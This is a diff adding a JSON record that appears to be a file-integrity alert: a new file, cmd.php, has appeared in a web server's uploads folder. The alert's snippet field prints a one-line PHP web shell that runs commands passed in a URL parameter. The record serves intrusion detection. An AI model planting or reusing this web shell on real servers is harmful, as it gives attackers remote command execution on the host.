@@ -1,0 +1,22 @@
+{
+  "agent": {
+    "name": "web-01",
+    "ip": "10.20.30.71"
+  },
+  "data": {
+    "path": "/var/www/html/uploads/cmd.php",
+    "mode": "realtime",
+    "uid_after": "33",
+    "size_after": 412,
+    "snippet": "<?php system($_GET['c']); ?>"
+  },
+  "rule": {
+    "id": "550",
+    "level": 12,
+    "description": "Integrity checksum changed (new file under webroot)."
+  },
+  "predecoder": {
+    "program_name": "syscheck",
+    "timestamp": "May 11 11:08:33"
+  }
+}
